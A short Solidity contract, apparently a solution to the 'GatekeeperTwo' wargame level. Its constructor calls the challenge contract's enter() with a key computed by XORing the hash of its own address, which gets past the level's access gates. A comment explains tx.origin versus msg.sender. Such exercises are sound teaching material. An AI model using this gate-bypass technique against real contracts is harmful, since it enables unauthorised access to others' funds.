// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./hadcoins.sol";

// The tx.origin global variable refers to the original external
// account that started the transaction while msg.sender refers to the
// immediate account (it could be external or another contract account)
// that invokes the function. The tx.origin variable will always refer to
// the external account while msg.sender can be a contract or external account.
// If there are multiple function invocations on multiple contracts,
// tx.origin will always refer to the account that started the transaction
// irrespective of the stack of contracts invoked

contract Test {
    GatekeeperTwo public gatekeepertwo;

    constructor() public {
        gatekeepertwo = GatekeeperTwo(
            0xFbcFC31a63672cF5a58B35EEfA37e072B7584476
        );
        uint64 mx = 18446744073709551615;
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 keyresult = x ^ mx;
        gatekeepertwo.enter(bytes8(keyresult));
    }
}
